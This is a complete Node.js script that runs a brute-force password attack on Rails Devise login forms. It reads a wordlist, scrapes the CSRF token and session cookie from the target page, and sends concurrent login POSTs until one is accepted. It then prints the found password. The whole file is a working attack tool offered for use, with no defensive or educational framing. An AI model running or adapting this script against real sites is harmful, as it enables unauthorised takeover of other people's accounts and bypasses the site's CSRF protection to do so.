#! /usr/bin/env node

// Module Dependencies
var request  = require('request');
var fs       = require('fs');
var readline = require('readline');
var stream   = require('stream');
var es       = require('event-stream');
var async    = require('async');

// Usage message
if (process.argv.length !== 6) {
  console.log(
    'NodeJS Rails Devise Login Bruteforce 1.0\n' +
    'Usage: ./railsDevise.js <username> <wordlist> <target url> <max concurrent requests>' 
  );

  process.exit();
}

// Set user, filepath, url from CLI args
var USERNAME    = process.argv[2];
var FILEPATH    = process.argv[3];
var BASE_URL    = process.argv[4];
var CONCURRENCY = process.argv[5];

// Set regexp to define CSRF and login errors
var CSRF  = /<input name=\"authenticity_token\" type=\"hidden\" value=\"(.{44})\" \/>/;
var ERROR = /Invalid email or password/ ;

// Configure the CSRF token request
var csrfOptions = {
  url: BASE_URL,
  method: 'GET',
  headers: {},
};

// Define function to extract CSRF token
var getCSRF = function(callback) {
  request(csrfOptions, function (error, response, body) {
    if (!error && response.statusCode == 200) {
      var cookieString = response.headers['set-cookie'][0];
      var csrfToken    = body.match(CSRF)[1];

      callback(csrfToken, cookieString);
    }
  });
};

// Configure the login request
var loginOptions = function(password, csrfToken, cookieString) {
  return {
    url: BASE_URL,
    method: 'POST',
    headers: { 
      Cookie: cookieString 
    },
    form: {
      'authenticity_token': csrfToken,
      'user[email]': USERNAME,
      'user[password]': password,
      'commit': 'Sign+in'
    }
  };
};

var tryLogin = function(password, callback) {

  getCSRF(function(token, cookieString) {
    var opt = loginOptions(password, token, cookieString);
    // Send a login POST
    request(opt, function (error, response, body) {

      if (!error) { 
        // If we match known regex password is incorrect
        if (response.statusCode === 200 && body.match(ERROR)) {
          console.log('[-] Invalid: ' + password);
        } else if (response.statusCode < 400) {
          console.log(
            '[+] FOUND: ' + password  +
            '\n[+] Shutting down....' 
          );

          process.exit();
        } else {
          console.log('[-] Server responded with: ' + response.statusCode);
        }
      }
      
      callback && callback();
    });
  });
}

// =====================================================================
//  MAIN ===============================================================
// =====================================================================

console.log('[+] Starting bruteforce...')

var queue = async.queue(tryLogin, CONCURRENCY);

queue.drain = function() {
  console.log('[+] Finished');
};

console.log('[+] Reading wordlist...')

fs.createReadStream(FILEPATH)
  .pipe(es.split())
  .pipe(es.map(function(word) {
    queue.push(word);
  })
  .on('error', function() {
    console.log('[-] Error reading file');
  })
  .on('end', function() {
    console.log('[+] Full wordlist read');
  })
);
